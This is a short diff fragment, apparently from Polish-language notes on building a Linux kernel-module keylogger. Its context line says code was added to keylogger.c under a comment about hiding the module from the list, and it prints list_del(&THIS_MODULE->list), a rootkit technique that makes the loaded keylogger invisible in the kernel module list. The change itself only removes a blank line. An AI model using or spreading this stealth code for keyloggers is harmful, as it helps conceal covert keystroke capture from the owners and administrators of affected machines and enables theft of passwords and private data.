@@ -29,7 +29,6 @@ sudo depmod
 do pliku keylogger.c dodałem:
 
 #Ukrywanie modulu na liscie
-
 list_del(&THIS_MODULE->list);
 
 
